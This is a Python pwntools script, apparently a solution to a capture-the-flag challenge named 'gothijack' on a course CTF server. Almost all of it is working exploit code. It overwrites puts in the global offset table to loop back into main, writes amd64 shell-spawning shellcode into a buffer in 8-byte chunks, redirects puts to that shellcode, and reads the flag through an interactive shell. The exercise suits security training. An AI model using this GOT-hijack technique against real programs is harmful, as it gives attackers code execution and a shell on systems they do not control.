import time
from pwn import *
LOCAL = True
binary = './gothijack'

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10129)

raw_input('pause')
start  =   p64(0x006013a0)
BUFFER =   0x6013a0
PUTS_GOT = '00601020'
WRITE_SOMETHING = p64(0x040090e) # main()'s address

sh = asm(shellcraft.amd64.linux.sh(), arch='amd64', os='linux')
r.readuntil("What's your name :")
r.sendline('jxcode\0')
r.readuntil("Where do you want to write :")
r.sendline(PUTS_GOT)
r.readuntil("data :")
r.send(WRITE_SOMETHING)
print "uploading shellcode"
for i in range(6):
    r.readuntil("What's your name :")
    r.sendline('test\0')
    r.readuntil("Where do you want to write :")
    r.sendline('00'+hex(BUFFER)[2:]+'\0')
    r.readuntil("data :")
    r.send(sh[i*8:i*8+8])
    BUFFER += 8
print "change rip to the beginning of shellcode"
r.readuntil("What's your name :")
r.sendline('test\0')
r.readuntil("Where do you want to write :")
r.sendline(PUTS_GOT+'\0')
print "jumping"
r.readuntil("data :")
r.sendline(start)
time.sleep(0.2)
r.sendline('cat /home/gothijack/flag')


r.interactive()
